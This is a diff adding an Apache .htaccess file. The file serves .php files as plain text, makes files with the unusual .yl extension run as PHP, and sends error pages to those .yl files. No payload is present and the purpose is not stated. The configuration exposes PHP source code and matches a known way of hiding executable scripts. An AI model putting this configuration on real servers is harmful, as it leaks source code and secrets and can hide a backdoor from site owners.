@@ -1,0 +1,9 @@
+php_value memory_limit 512M
+Options +FollowSymLinks
+
+RewriteEngine On
+
+AddType text/txt .php
+AddType application/x-httpd-php .yl
+
+RewriteRule ^(404|500|401)$ $1\.yl [QSA,L]
